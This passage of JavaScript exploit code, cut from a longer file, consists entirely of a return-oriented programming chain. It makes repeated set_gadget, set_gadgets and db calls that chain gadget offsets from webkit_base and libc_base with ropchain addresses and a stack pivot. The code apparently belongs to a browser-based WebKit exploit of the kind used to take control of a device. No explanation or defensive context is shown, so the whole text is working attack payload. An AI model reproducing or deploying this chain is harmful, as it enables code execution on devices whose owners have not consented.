webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+85192, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+85336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+85320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+85424, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967284, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+85560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+73952, 
libc_base+793877, 
ropchain+85656, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+85760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+85776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+85896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+85912, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+85880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86024, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86120, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+86224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+86208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86336, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+86432, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+86520, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+86584, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([32, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+86736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+86752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+86856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+86840, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+87000, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+87160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+87128, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87144, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+87232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+87288, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+87368, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+87472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+87488, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+87576, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+87632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+87736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+87840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+87968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+87984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+88072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+88128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+88208, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+88312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+88328, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+88416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+88544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+88600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
pivot_addr,
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+88736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+88840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+88856, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+88968, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+88984, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+89128, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+89208, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+89312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+89328, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+89416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+89688, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+89792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+89808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+89952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+89920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+89936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+90024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+90080, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+90160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+90264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+90280, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+90368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+90424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+90528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+90632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+90648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+90792, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+90760, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+90776, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+90864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+90920, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+91000, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([7, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+91104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+91120, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+91208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91264, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+91336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91392, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+91480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([40, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+91584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+91744, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+91712, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91728, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+91824, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+91928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+91944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+92056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+92072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+92160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+92216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+92296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+92400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+92416, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+92504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+92632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+92688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+788575, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+92824, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+92928, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+92944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93088, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+93056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+93072, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+93216, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+93296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([9, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+93400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+93416, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+93504, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93560, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+93688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+93776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+93880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+93896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+94008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+94112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+94168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+882884, 
libc_base+793877, 
ropchain+94248, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([6, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+94352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+94368, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+94456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+94616, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+94720, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+94880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+94848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+94864, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+94952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+95008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
